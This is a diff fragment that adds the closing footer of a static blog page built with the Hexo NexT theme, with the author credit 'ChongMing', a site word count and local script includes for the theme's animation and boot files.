+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ChongMing | 感谢阅读</span>
+    <span class="post-meta-divider">|</span>
+    <span class="post-meta-item-icon">
+      <i class="fa fa-area-chart"></i>
+    </span>
+    <span title="站点总字数">102k</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+      </div>
+    </footer>
+  </div>
+
+  
+  <script src="/lib/anime.min.js"></script>
+  <script src="/lib/velocity/velocity.min.js"></script>
+  <script src="/lib/velocity/velocity.ui.min.js"></script>
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/motion.js"></script>
+
+
+<script src="/js/schemes/pisces.js"></script>
+
+
+<script src="/js/next-boot.js"></script>
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+</body>
+</html>
